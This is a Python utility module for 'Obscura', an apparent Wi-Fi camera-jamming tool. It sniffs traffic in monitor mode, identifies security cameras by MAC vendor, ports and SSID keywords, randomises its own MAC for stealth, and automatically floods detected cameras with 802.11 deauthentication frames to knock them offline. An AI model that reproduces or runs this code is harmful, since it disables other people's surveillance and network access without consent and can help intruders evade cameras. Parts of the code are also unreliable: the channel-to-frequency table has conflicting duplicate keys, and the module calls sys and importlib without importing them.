"""
utils.py - Core utility, config, and packet processing logic for Obscura.
Handles:
    - Interface control (monitor mode, channel hop)
    - Packet classification (camera detection, Wi-Fi discovery)
    - Logging (file + UI integration)
    - Shared global state (camera + network tables)
"""

import os
import subprocess
import threading
import time
import json
import re
import logging
import logging.handlers
from datetime import datetime
import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Elt, Dot11Deauth

# ─── Constants ─────────────────────────────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "jammer_log.txt")
CONFIG_PATH = os.path.expanduser("~/.config/obscura_config.json")

running_event = threading.Event()
running_event.set()
running = lambda: running_event.is_set()

# Shared State
detected_cameras = {}
detected_networks = {}
detected_cameras_lock = threading.Lock()
detected_networks_lock = threading.Lock()

camera_jamming_active = False
sdr_jamming_active = False
network_deauth_active = False
hybrid_jamming_active = False

DEBUG_MODE = False
camera_oui_vendors = None

SIGNAL_STRENGTH_THRESHOLD = -120
JAM_DURATION = 300
DEAUTH_DURATION = 120

INTERFACE = None
CURRENT_BSSID = None

CHANNEL_TO_FREQ = {
    # 2.4 GHz band (Channels 1–14)
    1: 2412000000, 2: 2417000000, 3: 2422000000, 4: 2427000000,
    5: 2432000000, 6: 2437000000, 7: 2442000000, 8: 2447000000,
    9: 2452000000, 10: 2457000000, 11: 2462000000, 12: 2467000000,
    13: 2472000000, 14: 2484000000,

    # 5 GHz band (UNII-1 to UNII-3 & UNII-4 extensions)
    36: 5180000000, 38: 5190000000, 40: 5200000000, 42: 5210000000,
    44: 5220000000, 46: 5230000000, 48: 5240000000,
    50: 5250000000, 52: 5260000000, 54: 5270000000, 56: 5280000000,
    58: 5290000000, 60: 5300000000, 62: 5310000000, 64: 5320000000,
    100: 5500000000, 102: 5510000000, 104: 5520000000, 106: 5530000000,
    108: 5540000000, 110: 5550000000, 112: 5560000000, 114: 5570000000,
    116: 5580000000, 118: 5590000000, 120: 5600000000, 122: 5610000000,
    124: 5620000000, 126: 5630000000, 128: 5640000000, 130: 5650000000,
    132: 5660000000, 134: 5670000000, 136: 5680000000, 138: 5690000000,
    140: 5700000000, 142: 5710000000, 144: 5720000000,
    149: 5745000000, 151: 5755000000, 153: 5765000000, 155: 5775000000,
    157: 5785000000, 159: 5795000000, 161: 5805000000, 163: 5815000000,
    165: 5825000000, 167: 5835000000, 169: 5845000000, 171: 5855000000,
    173: 5865000000, 175: 5875000000, 177: 5885000000,

    # 6 GHz band (Wi-Fi 6E, partial coverage of 20 MHz channels)
    1: 5955000000, 5: 5975000000, 9: 5995000000, 13: 6015000000,
    17: 6035000000, 21: 6055000000, 25: 6075000000, 29: 6095000000,
    33: 6115000000, 37: 6135000000, 41: 6155000000, 45: 6175000000,
    49: 6195000000, 53: 6215000000, 57: 6235000000, 61: 6255000000,
    65: 6275000000, 69: 6295000000, 73: 6315000000, 77: 6335000000,
    81: 6355000000, 85: 6375000000, 89: 6395000000, 93: 6415000000,
    97: 6435000000, 101: 6455000000, 105: 6475000000, 109: 6495000000,
    113: 6515000000, 117: 6535000000, 121: 6555000000, 125: 6575000000,
    129: 6595000000, 133: 6615000000, 137: 6635000000, 141: 6655000000,
    145: 6675000000, 149: 6695000000, 153: 6715000000, 157: 6735000000,
    161: 6755000000, 165: 6775000000, 169: 6795000000, 173: 6815000000,
    177: 6835000000, 181: 6855000000, 185: 6875000000, 189: 6895000000,
    193: 6915000000, 197: 6935000000, 201: 6955000000, 205: 6975000000,
    209: 6995000000, 213: 7015000000, 217: 7035000000, 221: 7055000000,
    
    #Bonded 
        # 2.4 GHz 40 MHz bonding (center frequencies)
    3: 2422000000, 4: 2427000000, 5: 2432000000, 6: 2437000000,
    7: 2442000000, 8: 2447000000, 9: 2452000000, 10: 2457000000,

    # 5 GHz 40 MHz bonding (center frequencies)
    38: 5190000000, 46: 5230000000, 54: 5270000000, 62: 5310000000,
    102: 5510000000, 110: 5550000000, 118: 5590000000, 126: 5630000000,
    134: 5670000000, 142: 5710000000, 151: 5755000000, 159: 5795000000,
    167: 5835000000,

    # 5 GHz 80 MHz bonding
    42: 5210000000, 58: 5290000000, 106: 5530000000, 122: 5610000000,
    138: 5690000000, 155: 5775000000, 171: 5855000000,

    # 5 GHz 160 MHz bonding
    50: 5250000000, 114: 5570000000, 163: 5815000000,

    # 6 GHz 40 MHz bonding
    3: 5965000000, 7: 5985000000, 11: 6005000000, 15: 6025000000,
    19: 6045000000, 23: 6065000000, 27: 6085000000, 31: 6105000000,
    35: 6125000000, 39: 6145000000, 43: 6165000000, 47: 6185000000,
    51: 6205000000, 55: 6225000000, 59: 6245000000, 63: 6265000000,
    67: 6285000000, 71: 6305000000, 75: 6325000000, 79: 6345000000,

    # 6 GHz 80 MHz bonding
    5: 5975000000, 13: 6015000000, 21: 6055000000, 29: 6095000000,
    37: 6135000000, 45: 6175000000, 53: 6215000000, 61: 6255000000,
    69: 6295000000, 77: 6335000000, 85: 6375000000,

    # 6 GHz 160 MHz bonding
    13: 6015000000, 45: 6175000000, 77: 6335000000
}


# ─── Logging Setup ─────────────────────────────────────────────────────────
logger = logging.getLogger("obscura_jammer")
logger.setLevel(logging.DEBUG if DEBUG_MODE else logging.INFO)
handler = logging.handlers.RotatingFileHandler(LOG_FILE, maxBytes=5 * 1024 * 1024, backupCount=2)
formatter = logging.Formatter("[%(asctime)s] %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)

def log_message(message, console_output=True, ui=None):
    timestamped = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}"
    
    # Log to file
    if message.startswith("[DEBUG]"):
        logger.debug(message)
        if DEBUG_MODE and console_output:
            print(timestamped)
    else:
        logger.info(message)
        if console_output:
            print(timestamped)

    # Log to UI if it's ready
    if ui:
        try:
            if hasattr(ui, "add_action_history"):
                ui.add_action_history(timestamped, "info" if not message.startswith("[DEBUG]") else "debug")
            elif hasattr(ui, "add_debug_message"):
                ui.add_debug_message(timestamped)
        except Exception as e:
            if DEBUG_MODE:
                print(f"[DEBUG] log_message UI error: {e}")

def find_and_import_plugin(plugin_name: str):
    current_dir = os.path.abspath(os.path.dirname(__file__))
    while True:
        candidate_dir = os.path.join(current_dir, "attack_plugins")
        plugin_path = os.path.join(candidate_dir, f"{plugin_name}.py")
        if os.path.exists(plugin_path):
            if candidate_dir not in sys.path:
                sys.path.insert(0, candidate_dir)
            spec = importlib.util.spec_from_file_location(plugin_name, plugin_path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            return module
        parent_dir = os.path.dirname(current_dir)
        if parent_dir == current_dir:
            raise ImportError(f"Plugin '{plugin_name}' not found in any parent 'attack_plugins' directory.")
        current_dir = parent_dir
        
def dump_packet(pkt):
    try:
        return pkt.summary() + "\n" + pkt.show(dump=True)
    except Exception:
        return "[DEBUG] Packet dump failed."

def normalize_mac(mac):
    return mac.upper().replace("-", ":")

def is_valid_mac(mac):
    return re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", mac) is not None

def get_ssid_from_pkt(pkt):
    ssid = "<Hidden>"
    if pkt.haslayer(Dot11Elt):
        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 0:
                try:
                    ssid = elt.info.decode(errors="ignore") or "<Hidden>"
                except:
                    ssid = "<Hidden>"
                break
            elt = elt.payload.getlayer(Dot11Elt)
    return ssid

def load_config():
    global SIGNAL_STRENGTH_THRESHOLD
    if os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH, "r") as f:
            cfg = json.load(f)
            SIGNAL_STRENGTH_THRESHOLD = cfg.get("signal_threshold", SIGNAL_STRENGTH_THRESHOLD)
            return cfg
    return {}

def save_config(config):
    os.makedirs(os.path.dirname(CONFIG_PATH), exist_ok=True)
    with open(CONFIG_PATH, "w") as f:
        json.dump(config, f, indent=4)

def find_stream_url(ip):
    return f"http://{ip}/video"

def get_wireless_interfaces():
    result = subprocess.run("iw dev | grep Interface", shell=True, capture_output=True, text=True)
    patterns = ["wlan", "wlx", "wlp", "wlo"]
    return [line.split()[-1] for line in result.stdout.splitlines() if any(p in line for p in patterns)]

def get_supported_channels(interface):
    try:
        result = subprocess.run(f"iwlist {interface} channel", shell=True, capture_output=True, text=True)
        return sorted(set(int(line.split("Channel ")[1].split()[0])
                          for line in result.stdout.splitlines() if "Channel" in line and "Current" not in line)) or [1, 6, 11]
    except Exception as e:
        log_message(f"[DEBUG] Error getting channels: {e}")
        return [1, 6, 11]

def is_monitor_mode(interface):
    try:
        result = subprocess.run(f"iwconfig {interface}", shell=True, capture_output=True, text=True)
        return "Mode:Monitor" in result.stdout
    except Exception as e:
        log_message(f"Error checking monitor mode: {e}")
        return False

def setup_monitor_mode(interface):
    try:
        if is_monitor_mode(interface):
            log_message(f"{interface} already in monitor mode")
            return interface
        subprocess.run(["systemctl", "stop", "NetworkManager"], capture_output=True)
        subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
        subprocess.run(["airmon-ng", "start", interface], capture_output=True)
        time.sleep(2)
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if "Interface" in line:
                new_iface = line.strip().split()[-1]
                if "mon" in new_iface and is_monitor_mode(new_iface):
                    return new_iface
        log_message(f"Failed to enable monitor mode on {interface}")
        return None
    except Exception as e:
        log_message(f"Error setting monitor mode: {e}")
        return None

def set_channel(interface, channel):
    try:
        result = subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], capture_output=True, text=True)
        log_message(f"[DEBUG] Attempted to set channel {channel} on {interface}")
        return result.returncode == 0
    except Exception as e:
        log_message(f"Channel set exception: {e}")
        return False

def channel_hopper(interface, channels):
    while running_event.is_set():
        if any([camera_jamming_active, network_deauth_active, sdr_jamming_active, hybrid_jamming_active]):
            time.sleep(5)
            continue
        for ch in channels:
            if not running_event.is_set():
                break
            set_channel(interface, ch)
            time.sleep(2)

def stealth_mode(interface):
    try:
        subprocess.run(["ifconfig", interface, "down"], capture_output=True)
        subprocess.run(["macchanger", "-r", interface], capture_output=True)
        subprocess.run(["ifconfig", interface, "up"], capture_output=True)
        log_message(f"[DEBUG] Stealth mode enabled on {interface}")
    except Exception as e:
        log_message(f"[DEBUG] Error enabling stealth mode: {e}")

def is_camera_mac(mac):
    global camera_oui_vendors
    if not is_valid_mac(mac):
        return False
    mac = normalize_mac(mac)
    if camera_oui_vendors is None:
        try:
            with open(os.path.join(BASE_DIR, "vendors.json")) as f:
                camera_oui_vendors = json.load(f)
        except Exception as e:
            log_message(f"[DEBUG] Failed to load vendors.json: {e}")
            return False
    return mac[:8] in camera_oui_vendors

def get_vendor_from_mac(mac):
    global camera_oui_vendors
    if not is_valid_mac(mac):
        return "Unknown"
    mac = normalize_mac(mac)
    if camera_oui_vendors is None:
        try:
            with open(os.path.join(BASE_DIR, "vendors.json")) as f:
                camera_oui_vendors = json.load(f)
        except:
            return "Unknown"
    return camera_oui_vendors.get(mac[:8], "Unknown")

def get_channel_from_pkt(pkt):
    elt = pkt.getlayer(Dot11Elt)
    while elt:
        if elt.ID == 3:
            return ord(elt.info)
        elt = elt.payload.getlayer(Dot11Elt)
    return "Unknown"

def is_camera_protocol(pkt):
    if pkt.haslayer(scapy.TCP):
        if pkt[scapy.TCP].dport in [554, 8000, 8883]:
            return True
        if pkt[scapy.TCP].dport in [80, 443] and pkt.haslayer(scapy.Raw) and b"ONVIF" in pkt[scapy.Raw].load:
            return True
    return False

def calculate_confidence_score(mac, ssid, pkt):
    score = 0
    ssid = ssid.upper() if ssid else "<UNKNOWN>"
    if is_camera_mac(mac): score += 80
    if any(k in ssid for k in ["CAMERA", "IPC", "NVR", "RING"]) and "IPHONE" not in ssid: score += 20
    if pkt.type == 2 and not pkt.haslayer(Dot11Beacon): score += 20
    if is_camera_protocol(pkt): score += 20
    if b'\x2d' not in bytes(pkt): score += 10
    if b'\xbf' not in bytes(pkt): score += 5
    try:
        caps = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}{Dot11ProbeResp:%Dot11ProbeResp.cap%}")
        if "privacy" in caps.lower(): score += 5
    except:
        pass
    return min(score, 100)

def send_deauth(target_mac, bssid, interface, count=1000, inter=0.001, bursts=1):
    try:
        with detected_networks_lock:
            channel = detected_networks.get(bssid, {}).get("channel", "1")
        set_channel(interface, int(channel))
        for _ in range(bursts):
            pkt = scapy.RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
            scapy.sendp(pkt, iface=interface, count=count, inter=inter, verbose=0)
        return True
    except Exception as e:
        log_message(f"[DEAUTH ERROR] {e}")
        return False

_last_stats_log = 0

def packet_handler(pkt, decision_engine, orchestrator, ui, detected_networks_queue, detected_cameras_queue):
    global _last_stats_log
    try:
        if not pkt.haslayer(Dot11):
            return

        ui.increment_packet_count()

        signal = pkt[scapy.RadioTap].fields.get('dBm_AntSignal', -100) if pkt.haslayer(scapy.RadioTap) else -100
        if signal < SIGNAL_STRENGTH_THRESHOLD:
            return

        ts = datetime.now()
        bssid = pkt[Dot11].addr2 if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp) else pkt.addr2

        # NETWORK
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            ssid = get_ssid_from_pkt(pkt)
            channel = get_channel_from_pkt(pkt)

            with detected_networks_lock:
                detected_networks[bssid] = {
                    "time": ts, "ssid": ssid, "signal": signal,
                    "channel": str(channel),
                    "clients": detected_networks.get(bssid, {}).get("clients", []),
                    "mfp": "privacy" in pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}{Dot11ProbeResp:%Dot11ProbeResp.cap%}")
                }
            log_message(f"[+] Network: {bssid} | SSID: {ssid} | Channel: {channel} | Signal: {signal}", ui=ui)
            detected_networks_queue.put({bssid: detected_networks[bssid]})

        # CAMERA
        mac_candidates = {pkt.addr1, pkt.addr2, pkt.addr3}
        camera_mac = next((m for m in mac_candidates if m and is_camera_mac(m)), None)
        if camera_mac:
            ssid = get_ssid_from_pkt(pkt)
            score = calculate_confidence_score(camera_mac, ssid, pkt)
            vendor = get_vendor_from_mac(camera_mac)

            with detected_cameras_lock:
                existing = detected_cameras.get(camera_mac, {})
                traits = set(existing.get("traits", []))
                if is_camera_protocol(pkt):
                    traits.add("Protocol")

                detected_cameras[camera_mac] = {
                    **existing,
                    "time": ts, "ssid": ssid, "vendor": vendor,
                    "score": score, "deauthed": False,
                    "signal": signal, "is_client": True,
                    "last_seen": ts, "discovery": "Wi-Fi",
                    "entropy": 0,
                    "bssid": bssid or existing.get("bssid"),
                    "traits": list(traits)
                }
            log_message(f"[+] Camera: {camera_mac} | SSID: {ssid} | Score: {score}", ui=ui)
            detected_cameras_queue.put({camera_mac: detected_cameras[camera_mac]})

        # AUTO DEAUTH
        if camera_jamming_active:
            with detected_cameras_lock:
                for mac, info in list(detected_cameras.items()):
                    if info['deauthed'] and (ts - info['last_seen']).total_seconds() > 30:
                        del detected_cameras[mac]
                        detected_cameras_queue.put({mac: None})
                    elif not info['deauthed'] and info.get('bssid'):
                        send_deauth(mac if info['is_client'] else "FF:FF:FF:FF:FF:FF", info['bssid'], INTERFACE)
                        detected_cameras[mac]['deauthed'] = True
                        detected_cameras[mac]['last_seen'] = ts

        # Periodic stats log
        if time.time() - _last_stats_log > 60:
            log_message(f"[STATS] Networks={len(detected_networks)} Cameras={len(detected_cameras)}")
            _last_stats_log = time.time()

    except Exception as e:
        log_message(f"[DEBUG] Packet handler error: {e}", ui=ui)
